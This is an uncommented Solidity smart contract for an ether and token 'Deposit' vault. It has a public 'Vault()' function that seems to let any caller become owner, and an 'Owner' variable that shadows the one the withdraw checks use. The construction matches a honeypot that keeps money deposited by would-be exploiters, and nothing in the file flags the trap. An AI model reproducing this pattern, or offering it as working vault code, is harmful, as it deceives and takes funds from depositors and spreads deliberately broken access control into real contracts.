1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.13;
7 
8 contract ForeignToken {
9     function balanceOf(address who) constant public returns (uint256);
10     function transfer(address to, uint256 amount) public;
11 }
12 
13 contract Owned {
14     address public Owner = msg.sender;
15     modifier onlyOwner { if (msg.sender == Owner) _; }
16 }
17 
18 contract Deposit is Owned {
19     address public Owner;
20     mapping (address => uint) public Deposits;
21 
22     event Deposit(uint amount);
23     event Withdraw(uint amount);
24     
25     function Vault() payable {
26         Owner = msg.sender;
27         deposit();
28     }
29     
30     function() payable {
31         deposit();
32     }
33 
34     function deposit() payable {
35         if (msg.value >= 1 ether) {
36             Deposits[msg.sender] += msg.value;
37             Deposit(msg.value);
38         }
39     }
40 
41     function kill() {
42         if (this.balance == 0)
43             selfdestruct(msg.sender);
44     }
45     
46     function withdraw(uint amount) payable onlyOwner {
47         if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
48             msg.sender.transfer(amount);
49             Withdraw(amount);
50         }
51     }
52     
53     function withdrawToken(address token, uint amount) payable onlyOwner {
54         uint bal = ForeignToken(token).balanceOf(address(this));
55         if (bal >= amount) {
56             ForeignToken(token).transfer(msg.sender, amount);
57         }
58     }
59 }